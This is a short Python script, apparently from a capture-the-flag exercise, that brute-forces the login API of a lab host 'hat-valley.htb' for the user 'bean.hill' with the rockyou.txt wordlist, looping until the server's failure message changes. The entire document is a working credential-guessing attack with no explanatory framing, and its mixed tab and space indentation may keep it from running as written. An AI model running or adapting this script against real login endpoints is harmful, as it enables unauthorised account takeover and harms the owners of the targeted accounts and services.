from requests import post
import time

wordlist = "/usr/share/wordlists/rockyou.txt"
usern = "bean.hill"

def ayy(username, password):
        endpoint = "http://hat-valley.htb/api/login"
        headers = ""
        payload = {
            "username" : username,
            "password" : password,
        }
        r = post(endpoint, json=payload, headers = headers)
        print("[+] " + r.text)
        return r.text

found = False
with open(wordlist,'r') as mariob:
    for passWL in mariob:
					if found == False:
						for pasw in passWL.split():
							print("[+++] testing " + usern + ":" + pasw)
							if ayy(usern, pasw) == "Incorrect username or password":
								print("[+] Found?: " + str(found))
								time.sleep(.01)
							else:
								found = True
								print("[+] Found?: " + str(found) + " | password: " + pasw)
					else: exit()
